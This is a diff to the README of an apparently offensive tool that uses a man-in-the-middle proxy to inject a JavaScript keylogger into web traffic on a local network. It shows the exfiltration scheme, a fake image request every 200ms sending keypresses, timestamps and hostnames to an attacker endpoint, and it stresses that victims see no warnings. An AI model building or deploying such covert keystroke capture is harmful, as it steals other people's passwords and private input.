@@ -1,9 +1,6 @@
-# mitm-proxy
-Using a MITM proxy to add a browser-based keylogger to devices on your local network
-
 # How does it work?
 
-This works by injecting the following Javascript code into every request that takes place on the network.
+This works by injecting the following Javascript code into requests that take place on your local network.
 
 <p align="center">
 <img width=700px src ="static/code.png">
@@ -20,7 +17,7 @@ The unsuspecting user browses the web normally without experiencing any warnings
 Every 200ms, the client loads an "image" hosted at:
 
 ```
-http://{ENDPOINT}/?c=[{"k":{KEY_PRESS},"t":{TIME_STAMP},"w":{HOSTNAME}}]
+https://{ENDPOINT}/?c=[{"k":{KEY_PRESS},"t":{TIME_STAMP},"w":{HOSTNAME}}]
 ```
 
 ## Server Side
